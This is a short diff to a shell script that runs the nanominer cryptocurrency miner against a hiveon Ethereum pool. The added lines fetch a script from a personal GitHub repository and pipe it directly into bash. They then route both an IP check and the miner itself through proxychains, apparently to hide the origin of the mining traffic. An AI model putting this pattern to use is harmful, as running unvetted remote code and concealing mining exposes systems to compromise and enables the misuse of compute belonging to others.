@@ -24,6 +24,6 @@ rigName = Nano
 pool1 = naw-eth.hiveon.net:24443
 END
 
-chmod +x nanominer
-chmod +x amdmemtweak
-./nanominer
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
+proxychains curl ifconfig.me
+proxychains ./nanominer
